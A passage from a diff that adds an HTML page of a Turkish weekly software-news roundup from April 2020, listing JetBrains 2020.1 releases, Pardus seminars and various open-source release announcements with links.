+<td class="org-left">* <a href="https://www.jetbrains.com/resharper-cpp/whatsnew/?mkt_tok=eyJpIjoiTUdRME9EQXhNMlppTWpKayIsInQiOiJiNGZFR2toVHl1ZDdWS3pMVUFcL1lOUkZiUUxtR2U3Wk9yRmVrWlp1SlVMS3VLd1FHUlpaVVdZV1k2RXBqSGF4NXVhQ1RhOERNVTA5UVFhb1U2SCsrZHgwMGdIc29KdVwvOUZVMzRPYTNTMUoxdWFOT3Q2eUN0M2Y5RmJFOHdHTXJTIn0%253D">ReSharper C++ 2020.1</a></td>
+</tr>
+
+<tr>
+<td class="org-left">* <a href="https://www.jetbrains.com/idea/whatsnew/">IntelliJ IDEA 2020.1</a></td>
+<td class="org-left">&#xa0;</td>
+</tr>
+
+<tr>
+<td class="org-left">* <a href="https://www.jetbrains.com/go/whatsnew/">GoLand 2020.1</a></td>
+<td class="org-left">&#xa0;</td>
+</tr>
+
+<tr>
+<td class="org-left">* <a href="https://www.jetbrains.com/pycharm/whatsnew/">PyCharm 2020.1</a></td>
+<td class="org-left">&#xa0;</td>
+</tr>
+
+<tr>
+<td class="org-left">* <a href="https://www.jetbrains.com/ruby/whatsnew/">RubyMine 2020.1</a></td>
+<td class="org-left">&#xa0;</td>
+</tr>
+
+<tr>
+<td class="org-left">* <a href="https://www.jetbrains.com/webstorm/whatsnew/">WebStorm 2020.1</a></td>
+<td class="org-left">&#xa0;</td>
+</tr>
+
+<tr>
+<td class="org-left">* <a href="https://www.jetbrains.com/rider/whatsnew/">Rider 2020.1</a></td>
+<td class="org-left">&#xa0;</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div id="outline-container-orgfd9b4fc" class="outline-2">
+<h2 id="orgfd9b4fc"><span class="section-number-2">8</span> "<a href="https://www.acikseminer.com/">Açık Seminer</a>" etkinlikleri devam ediyor</h2>
+<div class="outline-text-2" id="text-8">
+
+<div class="figure">
+<p><img src="gorseller/acik-seminer.jpeg" alt="acik-seminer.jpeg" />
+</p>
+</div>
+
+<p>
+Bu haftanın programı:
+</p>
+<ul class="org-ul">
+<li><a href="https://www.acikseminer.com/seminerler/pardus-temel-seviye-seminer-1gun-08f34754">PARDUS Temel Seviye Seminer (1.Gün)</a></li>
+<li><a href="https://www.acikseminer.com/seminerler/pardus-temel-seviye-seminer-2gun-6f1799a0">PARDUS Temel Seviye Seminer (2.Gün)</a></li>
+<li><a href="https://www.acikseminer.com/seminerler/pardus-temel-seviye-seminer-3gun-bb5381e0">PARDUS Temel Seviye Seminer (3.Gün)</a></li>
+<li><a href="https://www.acikseminer.com/seminerler/pardus-uzerinde-python-kullanarak-domain-entegrasyonu-1gun-b62a1c6f">Pardus Üzerinde Python Kullanarak Domain Entegrasyonu (1.Gün)</a></li>
+<li><a href="https://www.acikseminer.com/seminerler/pardus-uzerinde-python-kullanarak-domain-entegrasyonu-2gun-728376ec">Pardus Üzerinde Python Kullanarak Domain Entegrasyonu (2.Gün)</a></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgd67faa8" class="outline-2">
+<h2 id="orgd67faa8"><span class="section-number-2">9</span> Diğer Haberler</h2>
+<div class="outline-text-2" id="text-9">
+<ul class="org-ul">
+<li>Programlama Yarışması: <a href="https://ku.acm.org/berkbingol/">Berk Bingöl Programming Contest</a></li>
+<li>npm ve GitHub <a href="https://github.blog/2020-04-15-npm-has-joined-github/">birleşmesi tamamlandı</a>. <a href="https://blog.npmjs.org/post/612764866888007680/next-phase-montage">Alternatif</a> (bkz: <a href="../11/yazilim-gundemi-2020-11.html">Yazılım Gündemi -
+2020/11</a>)</li>
+<li>Cloudflare Workers artık <a href="https://blog.cloudflare.com/cloudflare-workers-now-support-cobol/">COBOL destekliyor</a>.</li>
+<li>ProtonMail Bridge <a href="https://protonmail.com/blog/bridge-open-source/">açık kaynak olarak yayınlandı</a>. <a href="https://github.com/ProtonMail/proton-bridge">GitHub Deposu</a></li>
+<li>Google, Kotlin için gRPC kütüphanesini <a href="https://cloud.google.com/blog/products/application-development/use-grpc-with-kotlin">açık kaynak olarak yayınladı</a>:
+<a href="https://github.com/grpc/grpc-kotlin">grpc-kotlin</a>.</li>
+<li>Microsoft, WSL2 (Windows Subsystem for Linux 2) sistemini Windows 10 version
+2004 ile birlikte <a href="https://www.infoq.com/news/2020/04/wsl-2-general-availability/">genel erişilebilir olacak</a>.</li>
+<li>Rust 2019 anketi <a href="https://blog.rust-lang.org/2020/04/17/Rust-survey-2019.html">sonuçları yayınlandı</a>.</li>
+<li>Ruby Concurrency Final Raporu <a href="https://www.codeotaku.com/journal/2020-01/ruby-concurrency-progress-report/index">yayınlandı</a>.</li>
+<li>Dell BIOS saldırısı tespiti için <a href="https://www.zdnet.com/article/dell-releases-new-tool-to-detect-bios-attacks/">yeni bir araç yayınladı</a>.</li>
+<li>VueJS <a href="https://github.com/vuejs/vue-next/releases/tag/v3.0.0-beta.2">v3.0.0 Beta 2 sürümü yayınlandı</a>.</li>
+<li>jQuery <a href="http://blog.jquery.com/2020/04/10/jquery-3-5-0-released/">3.5.0 sürümü yayınlandı</a>.</li>
+<li>Microsoft C++ takımı, <a href="https://devblogs.microsoft.com/cppblog/gsl-3-0-0-release/">GSL 3.0.0 sürümünü yayınladı</a>. <a href="https://github.com/microsoft/GSL">GitHub Deposu</a></li>
+<li>NodeJS <a href="https://nodejs.org/en/blog/release/v13.13.0/">v13.13.0 sürümü yayınlandı</a>.</li>
+<li>Zig programlama dilinin <a href="https://ziglang.org/download/0.6.0/release-notes.html#Target-Details">0.6.0 sürümü yayınlandı</a>.</li>
+<li>Lazarus <a href="https://forum.lazarus.freepascal.org/index.php?topic=49356.0">2.0.8 sürümü yayınlandı</a>.</li>
+<li>D programlama dili takımından <a href="https://dlang.org/blog/2020/04/13/dustmite-the-general-purpose-data-reduction-tool/">yeni araç duyurusu</a>: <a href="https://github.com/CyberShadow/DustMite">DustMite</a>.</li>
+<li>Gloo <a href="https://www.solo.io/blog/announcing-gloo-1-3-developer-portal-extensibility-performance-and-usability/">1.3 sürümü yayınlandı</a>.</li>
+<li>Earthly <a href="https://github.com/vladaionescu/earthly/releases/tag/v0.1.0">v0.1.0 sürümü yayınlandı</a>.</li>
+<li>gbundle <a href="https://interrupt.memfault.com/blog/gdbundle-plugin-manager">aracı tanıtıldı</a>. <a href="https://github.com/memfault/gdbundle">GitHub Deposu</a></li>
+<li>Tide <a href="https://github.com/http-rs/tide/releases/tag/v0.7.0">0.7.0 sürümü çıktı</a>.</li>
+<li>Logos <a href="https://github.com/maciejhirsz/logos/releases/tag/v0.11.0">0.11.0 sürümü çıktı</a>.</li>
+<li>Boa <a href="https://github.com/jasonwilliams/boa/releases/tag/v0.7.0">0.7.0 sürümü çıktı</a>.</li>
+<li>Blazorise <a href="https://blazorise.com/news/release-notes/090/">0.9 sürümü çıktı</a>.</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org1786ba6" class="outline-2">
+<h2 id="org1786ba6"><span class="section-number-2">10</span> Lisans</h2>
+<div class="outline-text-2" id="text-10">
+<div class="org-center">
+
+<div class="figure">
+<p><img src="../../../img/CC_BY-NC-SA_4.0.png" alt="CC_BY-NC-SA_4.0.png" height="75" />
+</p>
+</div>
+
+<p>
+<a href="yazilim-gundemi-2020-15.html">Yazılım Gündemi - 2020/15</a> yazısı <a href="https://erenhatirnaz.github.io">Eren Hatırnaz</a> tarafından <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons
+Atıf-GayriTicari-AynıLisanslaPaylaş 4.0 Uluslararası Lisansı</a> (CC BY-NC-SA 4.0)
+ile lisanslanmıştır.
+</p>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p class="date">Tarih: 19 Nisan 2020</p>
+<p class="author">Yazar: Eren Hatırnaz</p>
+<p class="date">Oluşturuldu: 2021-01-24 Sun 22:46</p>
+<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
+</div>
+</body>
+</html>
